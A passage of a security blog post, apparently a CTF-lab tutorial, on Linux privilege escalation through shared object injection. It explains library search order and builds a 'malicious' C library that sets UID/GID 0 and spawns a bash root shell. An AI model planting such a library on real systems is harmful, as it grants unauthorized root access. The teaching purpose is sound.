@@ -1,0 +1,1416 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Privilege Escalation - Shared Object Injection for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-so-injection/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Linux Privilege Escalation - Shared Object Injection for CTF Creators">
+  <meta property="og:description" content="Can I load malicious libraries? (*&lt;*)">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:modified_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Shared Object Injection">
+    <meta property="article:tag" content="Libraries">
+    <meta property="article:tag" content="Static Libraries">
+    <meta property="article:tag" content="Dynamic Libraries">
+    <meta property="article:tag" content="Gnu Linker">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Linux Privilege Escalation - Shared Object Injection for CTF Creators">
+  <meta name="twitter:description" content="Can I load malicious libraries? (*&lt;*)">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-so-injection/" /><link rel="prev" href="//localhost:1313/linux-privesc-sockets/" /><link rel="next" href="//localhost:1313/linux-privesc-services/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation - Shared Object Injection for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/linux-privesc-so-injection\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "privilege escalation, shared object injection, libraries, static libraries, dynamic libraries, gnu linker, ld, strace, c payloads, suid, defend","wordcount":  3205 ,
+        "url": "\/\/localhost:1313\/linux-privesc-so-injection\/","datePublished": "2021-12-28T11:33:00+08:00","dateModified": "2021-12-28T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - Shared Object Injection for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3205 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;16 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#libraries">Libraries</a>
+      <ul>
+        <li><a href="#static-libraries">Static Libraries</a></li>
+        <li><a href="#dynamic-libraries">Dynamic Libraries</a></li>
+        <li><a href="#dynamic-linking">Dynamic Linking</a></li>
+        <li><a href="#ld---the-gnu-linker">ld - The GNU Linker</a></li>
+        <li><a href="#default-mitigations">Default Mitigations</a></li>
+        <li><a href="#shared-object-injection">Shared Object Injection</a></li>
+        <li><a href="#dynamically-loaded-libraries-search-order">Dynamically Loaded Libraries Search Order</a></li>
+      </ul>
+    </li>
+    <li><a href="#setting-up-the-workspace">Setting Up The Workspace</a></li>
+    <li><a href="#privilege-escalation-via-write-permissions-in-usrlib">Privilege Escalation via Write permissions in /usr/lib</a></li>
+    <li><a href="#privilege-escalation-via-ld_preload">Privilege Escalation via LD_PRELOAD</a></li>
+    <li><a href="#privilege-escalation-via-ld_library_path">Privilege Escalation via LD_LIBRARY_PATH</a></li>
+    <li><a href="#privilege-escalation-via-ldconfig">Privilege Escalation via LDCONFIG</a></li>
+    <li><a href="#privilege-escalation-via-fake-ldsoconf">Privilege Escalation via Fake ld.so.conf</a></li>
+    <li><a href="#privilege-escalation-via-missing-shared-object">Privilege Escalation via Missing Shared Object</a></li>
+    <li><a href="#defend">Defend</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="libraries">Libraries</h1>
+<p>A library is a file containing compiled code that is used by developers to avoid re-writing the same pieces of code used in multiple programs; this is often known as modular programming. It can contain classes, methods or data structures and will be linked to the program that will use it at the compilation time.</p>
+<p>There are two main types of libraries in Linux:</p>
+<ul>
+<li>Static libraries (.a extension)</li>
+<li>Dynamic or shared libraries (.so extension)</li>
+</ul>
+<h2 id="static-libraries">Static Libraries</h2>
+<p>Static libraries will become part of the program so they will be unalterable once the compilation is done. This means that the running program has its own copy of the library, which won’t be interesting to us, since we cannot do anything.</p>
+<h2 id="dynamic-libraries">Dynamic Libraries</h2>
+<p>Dynamic libraries can be used in two ways:</p>
+<ul>
+<li>Dynamic linking (dynamically linked, where a program is linked with the shared library and the kernel loads the library if it’s not in memory upon execution).</li>
+<li>Dynamic loading (dynamically loaded, the program takes full control by calling functions with the library).</li>
+</ul>
+<p>If we manage to alter the content of a dynamic library, we should be able to control the execution of the calling program and that’s what we want!</p>
+<h2 id="dynamic-linking">Dynamic Linking</h2>
+<p>Since these libraries are dynamically linked to the program, the operating system needs to know where to look for these libraries because if the operating system doesn&rsquo;t know where the libraries are located, then it won&rsquo;t find them and therefore, the libraries will not be executed, resulting in an error. To solve this we can create dynamic links and do that we can use the GNU linker.</p>
+<p>ld is the GNU linker.</p>
+<h2 id="ld---the-gnu-linker">ld - The GNU Linker</h2>
+<p>The following methods can be used for specifying the location of dynamic libraries:</p>
+<ul>
+<li>The <code>-rpath</code> or <code>-rpath-link</code> options when compiling the application.</li>
+<li>The environment variable <code>LD_RUN_PATH</code>.</li>
+<li>The environment variable <code>LD_LIBRARY_PATH</code>.</li>
+<li>The value of <code>DT_RUNPATH</code> or <code>DT_PATH</code>.</li>
+<li>Placing libraries in the default <code>/lib</code> or <code>/usr/lib</code> directories.</li>
+<li>Specifying a directory containing our libraries in <code>/etc/ld.so.conf</code>.</li>
+</ul>
+<h2 id="default-mitigations">Default Mitigations</h2>
+<p>As an attacker, our objective is to control one of the methods mentioned before in order to replace an existing dynamic library with a malicious one.However, by default, security measures have been put in place in Linux.</p>
+<p>This is not the end. In this article, we will see that there are so many ways to make this privilege escalation vector possible.</p>
+<h2 id="shared-object-injection">Shared Object Injection</h2>
+<p>Shared libraries are libraries that are loaded by programs when they start.</p>
+<p>If we can write or replace a shared library that is used by a SUID binary/program. As an attacker, we can create some malicious code and the program that loads the shared library will also execute the code that we create.</p>
+<p>In other words, shared object libraries can be injected or hijacked during a program execution. We could import malicious shared object to elevate privileges in a system.</p>
+<h2 id="dynamically-loaded-libraries-search-order">Dynamically Loaded Libraries Search Order</h2>
+<p>This is the order in which programs look for shared object files:</p>
+<ol>
+<li>The directories in the LD_LIBRARY_PATH environment variable.</li>
+<li>The directories specified in /etc/ld.so.cache which is generated from the configuration file which is /etc/ld.so.conf.</li>
+<li>Lastly, we have the /lib directory, which is a symbolic link to /usr/lib.</li>
+</ol>
+<p>Note: This is the order for this article; there are other ways in which you can compile your program and may alter the search order. If you want to know the search order for you, read the description of the man page (<a href="https://man7.org/linux/man-pages/man8/ld.so.8.html" target="_blank" rel="noopener noreffer ">ld.so</a>)</p>
+<h1 id="setting-up-the-workspace">Setting Up The Workspace</h1>
+<p>Install the required packages for this video:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ sudo apt update <span class="o">&amp;&amp;</span> sudo apt install -y vim gcc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now <code>clear</code> the screen:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ clear
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s start by creating a working directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ mkdir so-files
+</span></span><span class="line"><span class="cl">user@pwn:~$ <span class="nb">cd</span> !$
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> so-files
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;ll create a file named <code>libcustom.c</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ vim libcustom.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This print a message and nothing more:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">say_hi</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Message from libcustom.c</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we&rsquo;ll create a header file named <code>libcustom.h</code>, which is the header file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ vim libcustom.h
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This code calls an external function, in this case, the function called <code>say_hi</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#ifndef say_hi_h__
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define say_hi_h__
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">void</span> <span class="nf">say_hi</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#endif  </span><span class="c1">// say_hi_h__
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we will write and create a program that simply prints a message. I will name this file as <code>myexec.c</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ vim myexec.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This code imports the <code>libcustom.h</code> header file, the <code>main()</code> function prints a message and executes the <code>say_hi()</code> function which is found in the header file <code>libcustom.h</code> and if the execution is successful it returns a status code of (0):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;libcustom.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Message from myexec.c!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">say_hi</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now create a new directory named <code>evil</code> and navigate there, this is where the malicious library will be placed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ mkdir evil
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ <span class="nb">cd</span> !$
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> evil
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lastly, we&rsquo;ll create the code that will be included in the malicious library file. I&rsquo;ll name this file as <code>libcustom.c</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ vim libcustom.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This code sets the UID (0) which is the UID of the root user. Then it sets the GID of (0) which is the root group. The next three lines print a message of their own. The last line spawns a bash shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">say_hi</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;I&#39;m the bad library!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;I&#39;m trying to spawn a root shell...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Check your shell!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now copy the original header file to our current working directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ cp ../libcustom.h .
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ls
+</span></span><span class="line"><span class="cl">libcustom.c  libcustom.h
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s create the malicious shared object:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ gcc -c -Wall -Werror -fPIC libcustom.c
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ gcc -shared -o libcustom.so libcustom.o
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user   <span class="m">281</span> Dec <span class="m">10</span> 12:13 libcustom.c
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user    <span class="m">88</span> Dec <span class="m">10</span> 12:14 libcustom.h
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user  <span class="m">2104</span> Dec <span class="m">10</span> 12:14 libcustom.o
+</span></span><span class="line"><span class="cl">-rwxrwxr-x <span class="m">1</span> user user <span class="m">16360</span> Dec <span class="m">10</span> 12:14 libcustom.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now go back to the main directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">cd</span> ~/so-files
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This creates an object file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ gcc -c -Wall -Werror -fPIC libcustom.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then create a shared object file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ gcc -shared -o libcustom.so libcustom.o
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Copy the shared object to the library directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ sudo cp libcustom.so /usr/lib/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, compile the program:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ gcc -Wall -o myexec myexec.c -lcustom
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we can confirm how this is loading the library with ldd:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ ldd ./myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffcb9571000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /lib/libcustom.so <span class="o">(</span>0x00007f74a1d09000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f74a1b17000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f74a1d24000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking at this directories we can see a symbolic link from /lib to usr/lib:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ ls -la /lib
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">7</span> Nov <span class="m">25</span> 07:43 /lib -&gt; usr/lib
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ ls -la /lib/libcustom.so
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">16200</span> Dec <span class="m">10</span> 12:15 /lib/libcustom.so
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files$ ls -la /usr/lib/libcustom.so
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">16200</span> Dec <span class="m">10</span> 12:15 /usr/lib/libcustom.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can also confirm the magic bytes with the program file:</p>
